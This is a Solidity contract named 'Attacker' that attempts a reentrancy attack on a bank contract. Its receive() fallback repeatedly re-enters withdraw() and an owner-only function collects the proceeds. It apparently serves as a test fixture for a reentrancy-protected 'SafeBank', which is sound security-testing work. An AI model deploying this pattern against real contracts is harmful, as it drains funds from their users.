// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ISafeBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    ISafeBank public bank;
    address public owner;

    constructor(address _bank) payable {
        bank = ISafeBank(_bank);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // reentrancy attempt
        }
    }

    function attack() external {
        bank.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
